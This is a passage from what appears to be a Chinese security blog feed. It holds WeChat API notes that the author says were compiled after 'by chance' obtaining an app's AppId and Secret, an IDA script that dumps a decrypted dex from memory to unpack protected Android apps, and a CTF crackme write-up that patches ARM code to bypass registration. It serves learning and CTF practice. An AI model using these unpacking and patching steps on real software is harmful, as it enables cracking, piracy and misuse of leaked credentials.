title="c、返回说明"></a>c、返回说明</h4><pre><code>对应创建接口，正确的Json返回结果:{&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;}</code></pre><h3 id="5、添加客服帐号"><a href="#5、添加客服帐号" class="headerlink" title="5、添加客服帐号"></a>5、<strong>添加客服帐号</strong></h3><p>开发者可以通过本接口为公众号添加客服账号，每个公众号最多添加10个客服账号。</p><h4 id="a、接口调用请求"><a href="#a、接口调用请求" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/kfaccount/add?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例"><a href="#b、POST数据示例" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-4"><a href="#c、返回说明-4" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="6、获取所有客服账号"><a href="#6、获取所有客服账号" class="headerlink" title="6、获取所有客服账号"></a>6、<strong>获取所有客服账号</strong></h3><p>开发者通过本接口，获取公众号中所设置的客服基本信息，包括客服工号、客服昵称、客服登录账号。</p><h4 id="a、接口调用请求-1"><a href="#a、接口调用请求-1" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN</code></pre><h4 id="b、返回说明"><a href="#b、返回说明" class="headerlink" title="b、返回说明"></a>b、返回说明</h4><pre><code>{    &quot;kf_list&quot;: [        {            &quot;kf_account&quot;: &quot;test1@test&quot;,             &quot;kf_nick&quot;: &quot;ntest1&quot;,             &quot;kf_id&quot;: &quot;1001&quot;            &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;        },         {            &quot;kf_account&quot;: &quot;test2@test&quot;,             &quot;kf_nick&quot;: &quot;ntest2&quot;,             &quot;kf_id&quot;: &quot;1002&quot;            &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw /0&quot;        }    ]}</code></pre><h3 id="7、修改客服帐号"><a href="#7、修改客服帐号" class="headerlink" title="7、修改客服帐号"></a>7、<strong>修改客服帐号</strong></h3><p>开发者可以通过本接口为公众号修改客服账号。</p><h4 id="a、接口调用请求-2"><a href="#a、接口调用请求-2" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/kfaccount/update?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例-1"><a href="#b、POST数据示例-1" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-5"><a href="#c、返回说明-5" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="8、删除客服帐号"><a href="#8、删除客服帐号" class="headerlink" title="8、删除客服帐号"></a>8、<strong>删除客服帐号</strong></h3><p>开发者可以通过该接口为公众号删除客服帐号。</p><h5 id="a、接口调用请求-3"><a href="#a、接口调用请求-3" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h5><pre><code>http请求方式: GEThttps://api.weixin.qq.com/customservice/kfaccount/del?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例-2"><a href="#b、POST数据示例-2" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-6"><a href="#c、返回说明-6" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="9、用户授权登陆第三方应用"><a href="#9、用户授权登陆第三方应用" class="headerlink" title="9、用户授权登陆第三方应用"></a>9、用户授权登陆第三方应用</h3><p>第三方使用网站应用授权登录前请注意已获取相应网页授权作用域（scope=snsapi_login）。</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><pre><code>https://open.weixin.qq.com/connect/qrconnect?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</code></pre><h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h5><pre><code>参数              是否必须                    说明appid              是                    应用唯一标识redirect_uri      是             请使用urlEncode对链接进行处理response_type      是                       填codescope              是           应用授权作用域，拥有多个作用域用逗号（,）分隔，网页应用目前仅填写snsapi_login即state              否           用于保持请求和回调的状态，授权请求后原样带回给第三方。该参数可用于防止csrf攻击（跨站请求伪造攻击），建议第三方带上该参数，可设置为简单的随机数加session进行校验</code></pre><h5 id="返回说明"><a href="#返回说明" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h5><pre><code>用户允许授权后，将会重定向到redirect_uri的网址上，并且带上code和state参数redirect_uri?code=CODE&amp;state=STATE</code></pre><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h4><pre><code>通过code获取access_tokenhttps://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</code></pre><h5 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h5><pre><code>参数                是否必须         说明appid               是      应用唯一标识，在微信开放平台提交应用审核通过后获得secret               是      应用密钥AppSecret，在微信开放平台提交应用审核通过后获得code               是      填写第一步获取的code参数grant_type           是      填authorization_code</code></pre><h5 id="返回说明-1"><a href="#返回说明-1" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h5><pre><code>正确的返回：{ &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;,&quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot;,&quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot;}</code></pre><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a><strong>第三步</strong></h4><pre><code>获取access_token后，进行接口调用，有以下前提：1. access_token有效且未超时；2. 微信用户已授权给第三方应用帐号相应接口作用域（scope）。</code></pre><h5 id="接口作用域（scope），能调用的接口有以下"><a href="#接口作用域（scope），能调用的接口有以下" class="headerlink" title="接口作用域（scope），能调用的接口有以下"></a>接口作用域（scope），能调用的接口有以下</h5><p>其中snsapi_base属于基础接口，若应用已拥有其它scope权限，则默认拥有snsapi_base的权限。</p><table><thead><tr><th style="text-align:left">授权作用域（scope）</th><th style="text-align:left">接口</th><th style="text-align:left">接口说明</th></tr></thead><tbody><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/oauth2/access_token</td><td style="text-align:left">通过code换取access_token、refresh_token和已授权scope</td></tr><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/oauth2/refresh_token</td><td style="text-align:left">刷新或续期access_token使用</td></tr><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/auth</td><td style="text-align:left">检查access_token有效性</td></tr><tr><td style="text-align:left">snsapi_userinfo</td><td style="text-align:left">/sns/userinfo</td><td style="text-align:left">获取用户个人信息</td></tr></tbody></table><h5 id="拉取用户信息-需scope为-snsapi-userinfo"><a href="#拉取用户信息-需scope为-snsapi-userinfo" class="headerlink" title="拉取用户信息(需scope为 snsapi_userinfo)"></a><strong>拉取用户信息(需scope为 snsapi_userinfo)</strong></h5><pre><code>http：GEThttps://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN </code></pre><h5 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h5><pre><code>参数                       描述access_token     网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同openid                用户的唯一标识lang             返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语</code></pre><h5 id="返回说明-2"><a href="#返回说明-2" class="headerlink" title="返回说明"></a>返回说明</h5><pre><code>正确时返回的JSON数据包如下：{&quot;openid&quot;:&quot; OPENID&quot;,   &quot; nickname&quot;: NICKNAME,    &quot;sex&quot;:&quot;1&quot;,    &quot;province&quot;:&quot;PROVINCE&quot;    &quot;city&quot;:&quot;CITY&quot;,    &quot;country&quot;:&quot;COUNTRY&quot;,     &quot;headimgurl&quot;:    &quot;http://wx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46&quot;,  &quot;privilege&quot;:[ &quot;PRIVILEGE1&quot; &quot;PRIVILEGE2&quot;     ],    &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } </code></pre><h5 id="检验授权凭证（access-token）是否有效"><a href="#检验授权凭证（access-token）是否有效" class="headerlink" title="检验授权凭证（access_token）是否有效"></a><strong>检验授权凭证（access_token）是否有效</strong></h5><pre><code>http：GEThttps://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID </code></pre><h5 id="参数说明-3"><a href="#参数说明-3" class="headerlink" title="参数说明"></a>参数说明</h5><pre><code>参数                             描述access_token      网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同openid                    用户的唯一标识    </code></pre><h5 id="返回说明-3"><a href="#返回说明-3" class="headerlink" title="返回说明"></a>返回说明</h5><pre><code>正确的JSON返回结果：{ &quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 错误时的JSON返回示例：{ &quot;errcode&quot;:40003,&quot;errmsg&quot;:&quot;invalid openid&quot;}</code></pre><h3 id="10、批量获取用户基本信息"><a href="#10、批量获取用户基本信息" class="headerlink" title="10、批量获取用户基本信息"></a>10、批量获取用户基本信息</h3><h4 id="请求说明"><a href="#请求说明" class="headerlink" title="请求说明"></a>请求说明</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/cgi-bin/user/info/batchget?access_token=ACCESS_TOKEN</code></pre><h4 id="POST数据示例"><a href="#POST数据示例" class="headerlink" title="POST数据示例"></a>POST数据示例</h4><pre><code>{   &quot;user_list&quot;: [       {           &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;,            &quot;lang&quot;: &quot;zh-CN&quot;       },        {           &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;,            &quot;lang&quot;: &quot;zh-CN&quot;       }   ]}</code></pre><h4 id="返回说明-4"><a href="#返回说明-4" class="headerlink" title="返回说明"></a>返回说明</h4><pre><code>{  &quot;user_info_list&quot;: [      {          &quot;subscribe&quot;: 1,           &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;,           &quot;nickname&quot;: &quot;iWithery&quot;,           &quot;sex&quot;: 1,           &quot;language&quot;: &quot;zh_CN&quot;,           &quot;city&quot;: &quot;Jieyang&quot;,           &quot;province&quot;: &quot;Guangdong&quot;,           &quot;country&quot;: &quot;China&quot;,           &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/xbIQx1GRqdvyqkMMhEaGOX802l1CyqMJNgUzKP8MeAeHFicRDSnZH7FY4XB7p8XHXIf6uJA2SCunTPicGKezDC4saKISzRj3nz/0&quot;,          &quot;subscribe_time&quot;: 1434093047,           &quot;unionid&quot;: &quot;oR5GjjgEhCMJFyzaVZdrxZ2zRRF4&quot;,           &quot;remark&quot;: &quot;&quot;,           &quot;groupid&quot;: 0,          &quot;tagid_list&quot;:[128,2]      },       {          &quot;subscribe&quot;: 0,           &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;,           &quot;unionid&quot;: &quot;oR5GjjjrbqBZbrnPwwmSxFukE41U&quot;,       }  ]}</code></pre><h3 id="11、获取微信公众号用户列表"><a href="#11、获取微信公众号用户列表" class="headerlink" title="11、获取微信公众号用户列表"></a>11、获取微信公众号用户列表</h3><h4 id="调用请求说明"><a href="#调用请求说明" class="headerlink" title="调用请求说明"></a>调用请求说明</h4><pre><code>http请求方式: GET（请使用https协议）https://api.weixin.qq.com/cgi-bin/user/get?access_token=ACCESS_TOKEN&amp;next_openid=NEXT_OPENID</code></pre><h4 id="参数说明-4"><a href="#参数说明-4" class="headerlink" title="参数说明"></a>参数说明</h4><pre><code>参数                    是否必须          说明access_token           是          调用接口凭证next_openid               是         第一个拉取的OPENID，不填默认从头开始拉取</code></pre><h4 id="返回说明-5"><a href="#返回说明-5" class="headerlink" title="返回说明"></a>返回说明</h4><pre><code>正确时返回JSON数据包：{&quot;total&quot;:2,&quot;count&quot;:2,&quot;data&quot;:{&quot;openid&quot;:[&quot;&quot;,&quot;OPENID1&quot;,&quot;OPENID2&quot;]},&quot;next_openid&quot;:&quot;NEXT_OPENID&quot;}</code></pre><h4 id="参数说明-5"><a href="#参数说明-5" class="headerlink" title="参数说明"></a>参数说明</h4><pre><code>参数                  说明total         关注该公众账号的总用户数count         拉取的OPENID个数，最大值为10000data         列表数据，OPENID的列表next_openid     拉取列表的最后一个用户的OPENID</code></pre><h3 id="12、企业新版微信客服"><a href="#12、企业新版微信客服" class="headerlink" title="12、企业新版微信客服"></a>12、企业新版微信客服</h3><h4 id="获取客服基本信息"><a href="#获取客服基本信息" class="headerlink" title="获取客服基本信息"></a><strong>获取客服基本信息</strong></h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN</code></pre><h4 id="返回说明-6"><a href="#返回说明-6" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h4><p>返回数据示例（正确时的JSON返回结果）：</p><pre><code>{    &quot;kf_list&quot; : [       {          &quot;kf_account&quot; : &quot;test1@test&quot;,          &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;,          &quot;kf_id&quot; : &quot;1001&quot;,          &quot;kf_nick&quot; : &quot;ntest1&quot;,          &quot;kf_wx&quot; : &quot;kfwx1&quot;       },       {          &quot;kf_account&quot; : &quot;test3@test&quot;,          &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;,          &quot;kf_id&quot; : &quot;1003&quot;,          &quot;kf_nick&quot; : &quot;ntest3&quot;,          &quot;invite_wx&quot; : &quot;kfwx3&quot;,          &quot;invite_expire_time&quot; : 123456789,          &quot;invite_status&quot; : &quot;waiting&quot;       }    ] }</code></pre><h4 id="参数说明-6"><a href="#参数说明-6" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                                          说明kf_account               完整客服帐号，格式为：帐号前缀@公众号微信号kf_nick                                    客服昵称kf_id                                    客服编号kf_headimgurl                             客服头像kf_wx                     如果客服帐号已绑定了客服人员微信号，则此处显示微信号invite_wx               如果客服帐号尚未绑定微信号，但是已经发起了一个绑定邀请，则此处显示绑定邀请的微信号invite_expire_time        如果客服帐号尚未绑定微信号，但是已经发起过一个绑定邀请，邀请的过期时间，为unix 时间戳invite_status           邀请的状态，有等待确认“waiting”，被拒绝“rejected”，过期“expired”</code></pre><h3 id="13、获取聊天记录"><a href="#13、获取聊天记录" class="headerlink" title="13、获取聊天记录"></a>13、<strong>获取聊天记录</strong></h3><h4 id="调用说明"><a href="#调用说明" class="headerlink" title="调用说明"></a>调用说明</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/msgrecord/getmsglist?access_token=ACCESS_TOKEN</code></pre><h4 id="POST数据示例如下："><a href="#POST数据示例如下：" class="headerlink" title="POST数据示例如下："></a>POST数据示例如下：</h4><pre><code> {    &quot;starttime&quot; : 987654321,    &quot;endtime&quot; : 987654321,    &quot;msgid&quot; : 1,    &quot;number&quot; : 10000}</code></pre><h4 id="参数说明-7"><a href="#参数说明-7" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                        说明starttime           起始时间，unix时间戳endtime            结束时间，unix时间戳，每次查询时段不能超过24小时msgid               消息id顺序从小到大，从1开始number               每次获取条数，最多10000条</code></pre><h4 id="返回说明-7"><a href="#返回说明-7" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h4><pre><code>{    &quot;recordlist&quot; : [       {          &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;,          &quot;opercode&quot; : 2002,          &quot;text&quot; : &quot; 您好，客服test1为您服务。&quot;,          &quot;time&quot; : 1400563710,          &quot;worker&quot; : &quot;test1@test&quot;       },       {          &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;,          &quot;opercode&quot; : 2003,          &quot;text&quot; : &quot;你好，有什么事情？&quot;,          &quot;time&quot; : 1400563731,          &quot;worker&quot; : &quot;test1@test&quot;       }    ],     &quot;number&quot;:2,     &quot;msgid&quot;:20165267 }</code></pre><h4 id="参数说明-8"><a href="#参数说明-8" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                               说明worker                完整客服帐号，格式为：帐号前缀@公众号微信号openid                          用户标识opercode            操作码，2002（客服发送信息），2003（客服接收消息）text                           聊天记录time                      操作时间，unix时间戳</code></pre><p>参考资料：</p><p>1、<a href="https://www.w3cschool.cn/weixinkaifawendang/f5ej1q84.html" target="_blank" rel="noopener">微信公众平台开发概述</a></p><p>2、<a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417674108&amp;token=&amp;lang=zh_CN" target="_blank" rel="noopener">微信开放平台</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。&lt;/p&gt;
&lt;h3 id=&quot;1、平台开发者获取access-token&quot;&gt;&lt;a href=&quot;#1、平台开发者获取access-tok
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>基于dvmDexFileOpenPartial的动态脱壳</title>
    <link href="/2019/05/%E5%9F%BA%E4%BA%8EdvmDexFileOpenPartial%E7%9A%84%E5%8A%A8%E6%80%81%E8%84%B1%E5%A3%B3/"/>
    <id>/2019/05/基于dvmDexFileOpenPartial的动态脱壳/</id>
    <published>2019-05-15T06:25:33.000Z</published>
    <updated>2019-07-26T09:55:41.915Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、dvmDexFileOpenPartial脱壳原理"><a href="#1、dvmDexFileOpenPartial脱壳原理" class="headerlink" title="1、dvmDexFileOpenPartial脱壳原理"></a>1、dvmDexFileOpenPartial脱壳原理</h3><p>基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。</p><p>加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数：</p><p>int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex)</p><p>第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。</p><p>方法的源码解读：<a href="http://www.blogfshare.com/load-dex-source.html" target="_blank" rel="noopener">从源码看Dex Dump于dvmDexFileOpenPartial原理</a></p><p>断点脱壳原理分析:<a href="https://www.cnblogs.com/jiaoxiake/p/6813127.html" target="_blank" rel="noopener">dvmDexFileOpenPartial断点脱壳原理分析</a></p><p>示例APP：<a href="https://github.com/eternalsakura/ctf_pwn/tree/master/android%E9%80%86%E5%90%91" target="_blank" rel="noopener">jscrack</a></p><p>由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。</p><h3 id="2、示例演示"><a href="#2、示例演示" class="headerlink" title="2、示例演示"></a>2、示例演示</h3><p>首先调试模式启动APP，</p><pre><code>adb forward tcp:23946 tcp:23946          #IDA端口转发adb shell am start -D -n 包名/activity名  #调试模式启动APP adb shell ps | grep 包名                  #获取APP的PIDadb forward tcp:8700 jdwp:pid            #进程端口转发</code></pre><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899006483.png" alt="1557899006483"></p><p>然后调整IDA的调试选项，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899051732.png" alt="1557899051732"></p><p>选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899178517.png" alt="1557899178517"></p><p>找到方法后，在其第一行下断点，如下情形。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899194095.png" alt="1557899194095"></p><p>然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。</p><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><p>附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899222926.png" alt="1557899222926"></p><p>单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899257190.png" alt="1557899257190"></p><p>在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。</p><pre><code>static main(void){auto fp, dex_addr, end_addr;fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);end_addr = R0 + R1;for ( dex_addr=R0; dex_addr &lt; end_addr; dex_addr ++ )fputc(Byte(dex_addr), fp);}</code></pre><p>选择jadx打开dex文件，可以看到源码已dump成功。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899587774.png" alt="1557899587774"></p><h3 id="3、系统差异"><a href="#3、系统差异" class="headerlink" title="3、系统差异"></a>3、系统差异</h3><p>此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。</p><p>脚本为</p><pre><code>static main(void){   auto fp, dex_addr, end_addr;   fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);  end_addr = R1 + R2;   for ( dex_addr=R1; dex_addr &lt; end_addr; dex_addr ++ )       fputc(Byte(dex_addr), fp);}</code></pre><p>参考文章：</p><p><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">IDA动态调试脱壳步骤</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;a href=&quot;#1、dvmDexFileOpenPartial脱壳原理&quot; class=&quot;headerlink&quot; title=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;/a&gt;1、dvm
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ISCC Android Crackme</title>
    <link href="/2019/04/ISCC-Android-Crackme/"/>
    <id>/2019/04/ISCC-Android-Crackme/</id>
    <published>2019-04-30T01:47:32.000Z</published>
    <updated>2019-07-26T09:56:02.225Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ISCC-Android-Crackme"><a href="#ISCC-Android-Crackme" class="headerlink" title="ISCC Android Crackme"></a>ISCC Android Crackme</h3><p>此为2013年ISCC的一道移动题，相对简单的题，懂点 ARM 指令就差不多了。对于新入手安卓逆向可以做做看来练手。要求是注册为企业版程序。以下分析是建立在伪代码基础上，然后分析修改点，修改ARM汇编。</p><p>题目下载：<a href="\2019\04\ISCC-Android-Crackme\crackme.apk">APP</a></p><p>通过反编译代码简单查看功能逻辑，首先是从onCreate函数开始，函数一开始就调用了MyApp的m变量，查看对应的反编译代码。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556518317348.png" alt="1556518317348"></p><p>MyApp是一个native方法的调用，调用了三个方法。</p><p>分别是initSN()、saveSN()、work()。并且执行了initSN方法，因此函数应该是注册码的对比和效验功能。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556518441133.png" alt="1556518441133"></p><p>然后在回到以上的代码执行，点击按钮“执行功能”，进入toast弹出界面，通过判断m值来执行是否触发注册方法，默认为0触发，如果注册成功则调用work()函数来做执行功能。查看doRegister，点击确认后，程序进入com.bfs.crackme1.RegActivity类下，</p><p><img src="\2019\04\ISCC-Android-Crackme\1556519314726.png" alt="1556519314726"></p><p>方法判断是否输入注册码，调用saveSN来保存输入的注册码，然后弹窗关闭自身线程。到此，也基本确认了initSN的方法和上文判断一致。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520139524.png" alt="1556520139524"></p><p>看完基本的Java层函数现在来看so文件的相关代码实现和流程。</p><p>查看so的一些函数表，可以看到定义了JNI_Onload，Java层执行System.loadLibrary()后，将执行此函数。同样从函数表中可以看出加密处理为MD5。查看JNI_Onload做了什么处理。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520638909.png" alt="1556520638909"></p><p>查看伪代码，使用RegisterNatives实现JNI，而RegisterNatives是来做什么处理的，可以查看如下文章：</p><p><a href="https://blog.csdn.net/qiuxiaolong007/article/details/7860610" target="_blank" rel="noopener">JNI：使用RegisterNatives方法传递和使用Java自定义类</a></p><p>而此处的作用基本可以看到是用来自定义函数命名，不然native中的函数名为Java_com_bfs_crackme1_MainActivity_initSN这种类型，下面只有n1、n2、n3来代替以上方法。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520977389.png" alt="1556520977389"></p><p>查看n1方法，读取sdcard下的reg.dat文件，来进行MD5效对，要求进行企业版注册，能看到的是注册成功将使用setValue进行对v1的赋值，其中按照MainActivity文件中的判断，猜测3为企业版MD5值。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556522659413.png" alt="1556522659413"></p><p>n2则为如下，读写的形式来对reg.dat 进行重写。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556524534479.png" alt="1556524534479"></p><p>work函数则为如下：</p><p><img src="\2019\04\ISCC-Android-Crackme\1556525011606.png" alt="1556525011606"></p><p>至此，函数名则分析清楚，n1对应initSN，n2对应saveSN，n3对应work。根据函数流程可以大概猜出判断行为：n2保存来自输入的参数的MD5-&gt;n1读取参数进行对应是否为注册值-&gt;注册成功则set到内存一个值-&gt;由work来读取这个值判断注册是否成功以及功能执行。</p><p>所以理论上说，patch点有如下处：</p><p>1、修改reg.dat为企业版的注册码，修改Java层代码让其不走注册函数。</p><p>2、解密MD5值，直接输入注册</p><p>3、修改n1，让其返回值永远为3</p><p>4、修改work函数获取的v2值。</p><p>修改时，发现第一种并不行，Java层参数值修改后，可能n2做了其他相关处理，第二种是可行，毕竟都获取到了注册码，但需要解密成功，此MD5只是简单的32345678。</p><p>第三种修改n1：</p><p>输入肯定为错误或者不输入值，因此只需要修改值为空或者其他未知情况下的返回值。</p><pre><code>.text:0000133C                 CMP     R0, #0.text:00001340                 MOVEQ   R1, #4.text:00001344                 MOV     R0, R7.text:00001348                 MOVNE   R1, R8</code></pre><p>修改为：</p><pre><code>.text:0000133C                 MOV     R0, #3.text:00001340                 MOVEQ   R1, #3.text:00001344                 MOV     R0, R7.text:00001348                 MOVNE   R1, R8</code></pre><p>让其在未输入的情况下返回企业版的返回值。修改编译安装后，打开即为企业版。</p><p>第四种修改work:</p><pre><code>.text:000014A0 10 40 2D E9                                     STMFD   SP!, {R4,LR}.text:000014A4 00 40 A0 E1                                     MOV     R4, R0.text:000014A8 6F FF FF EB                                     BL      n1.text:000014AC 04 00 A0 E1                                     MOV     R0, R4.text:000014B0 35 FF FF EB                                     BL      getValue.text:000014B8 00 00 50 E3                                     CMP     R0, #0</code></pre><p>增加一条指令，修改为:</p><pre><code>.text:000014A0 10 40 2D E9                                     STMFD   SP!, {R4,LR}.text:000014A4 00 40 A0 E1                                     MOV     R4, R0.text:000014A8 6F FF FF EB                                     BL      n1.text:000014AC 04 00 A0 E1                                     MOV     R0, R4.text:000014B0 35 FF FF EB                                     BL      getValue.text:000014B4 03 00 A0 E3                                     MOV     R0, #3.text:000014B8 00 00 50 